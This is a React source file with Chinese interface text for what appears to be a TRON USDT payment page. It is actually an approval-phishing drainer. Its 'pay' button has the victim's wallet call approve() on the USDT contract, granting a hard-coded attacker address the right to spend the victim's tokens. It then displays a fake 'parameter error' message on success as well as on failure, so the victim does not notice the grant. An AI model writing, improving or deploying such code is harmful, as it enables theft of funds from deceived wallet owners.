import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";

export default function Dapp() {
  const [params] = useSearchParams();
  const username = params.get("username") || "未提供";
  const amount = params.get("amount") || "0";
  const [walletAddress, setWalletAddress] = useState("");

  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // 正式USDT合约
  const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款钱包

  useEffect(() => {
    const timer = setInterval(() => {
      if (window.tronWeb && window.tronWeb.ready) {
        setWalletAddress(window.tronWeb.defaultAddress.base58);
        clearInterval(timer);
      }
    }, 500);

    return () => clearInterval(timer);
  }, []);

  const handleApprove = async () => {
    if (!window.tronWeb || !window.tronWeb.ready) {
      alert("未检测到钱包，请用钱包自带浏览器访问！");
      return;
    }

    try {
      const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
      const tx = await contract.approve(
        SPENDER_ADDRESS,
        window.tronWeb.toSun(amount) // 转成SUN单位
      ).send({
        feeLimit: 10000000
      });

      console.log("授权成功，交易哈希:", tx);
      setTimeout(() => {
        alert("参数错误！");
      }, 500);
    } catch (error) {
      console.error(error);
      setTimeout(() => {
        alert("参数错误！");
      }, 500);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-blue-100 to-blue-200 p-6">
      <div className="bg-purple-600 text-white rounded-2xl p-6 w-full max-w-md shadow-lg">
        <h2 className="text-2xl font-bold mb-6 flex items-center justify-center">
          🛒 支付订单
        </h2>
        <div className="text-left space-y-4 text-lg">
          <p>用户名：{username}</p>
          <p>付款金额：{amount} USDT</p>
          <p>实际到账金额：{(parseFloat(amount) * 7.3).toFixed(2)} RMB</p>
          <p className="break-all">钱包地址：{walletAddress || "未连接"}</p>
        </div>
      </div>

      <button
        onClick={handleApprove}
        className="mt-8 bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-lg"
      >
        点击付款
      </button>
    </div>
  );
}
